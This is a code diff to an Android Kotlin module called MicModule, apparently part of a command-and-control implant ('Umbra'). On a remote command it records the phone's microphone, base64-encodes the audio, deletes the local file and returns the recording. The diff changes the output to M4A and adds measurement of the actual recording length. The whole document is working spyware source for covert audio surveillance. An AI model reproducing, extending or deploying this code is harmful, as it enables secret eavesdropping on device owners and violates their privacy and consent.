@@ -2,11 +2,11 @@ package org.umbra.core.modules
 
 import android.content.Context
 import android.media.MediaRecorder
+import android.os.SystemClock
 import android.util.Base64
 import org.umbra.core.c2.Command
 import org.umbra.core.core.UmbraResponse
 import java.io.File
-import java.io.FileInputStream
 import kotlinx.coroutines.*
 
 object MicModule {
@@ -14,6 +14,8 @@ object MicModule {
     private var recorder: MediaRecorder? = null
     private var recordingFile: File? = null
     private var isRecording = false
+    private var recordStartTime = 0L
+    private var recordDuration = 0L
 
     suspend fun record(context: Context, cmd: Command): UmbraResponse {
         if (isRecording) {
@@ -23,12 +25,14 @@ object MicModule {
         val durationSec = (cmd.params["duration"]?.toIntOrNull() ?: 30).coerceIn(5, 300)
 
         return try {
-            val file = File(context.cacheDir, "umbra_mic_${System.currentTimeMillis()}.aac")
+            // Use MPEG_4 container with AAC encoder — more compatible than AAC_ADTS
+            // on Samsung devices. Produces .m4a files playable in all browsers.
+            val file = File(context.cacheDir, "umbra_mic_${System.currentTimeMillis()}.m4a")
             recordingFile = file
 
             val rec = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setAudioSamplingRate(44100)
                 setAudioEncodingBitRate(96000)
@@ -39,6 +43,7 @@ object MicModule {
 
             recorder = rec
             isRecording = true
+            recordStartTime = SystemClock.elapsedRealtime()
 
             // Wait for the recording duration to complete
             delay(durationSec * 1000L)
@@ -66,6 +71,12 @@ object MicModule {
             val rec = recorder
             val file = recordingFile
 
+            // Calculate actual elapsed time BEFORE stopping
+            if (recordStartTime > 0) {
+                recordDuration = (SystemClock.elapsedRealtime() - recordStartTime) / 1000
+                recordStartTime = 0
+            }
+
             if (rec != null) {
                 try { rec.stop() } catch (_: Exception) {}
                 try { rec.release() } catch (_: Exception) {}
@@ -80,10 +91,13 @@ object MicModule {
                 file.delete()
                 recordingFile = null
 
+                val dur = if (recordDuration > 0) recordDuration.toInt() else 0
+                recordDuration = 0
+
                 UmbraResponse.MicRecordingResponse(
                     audio_base64 = b64,
-                    duration_seconds = 0,
-                    format = "AAC",
+                    duration_seconds = dur,
+                    format = "M4A",
                     size_bytes = bytes.size.toLong()
                 )
             } else {
@@ -100,6 +114,8 @@ object MicModule {
         try { recorder?.release() } catch (_: Exception) {}
         recorder = null
         isRecording = false
+        recordStartTime = 0
+        recordDuration = 0
         recordingFile?.delete()
         recordingFile = null
     }
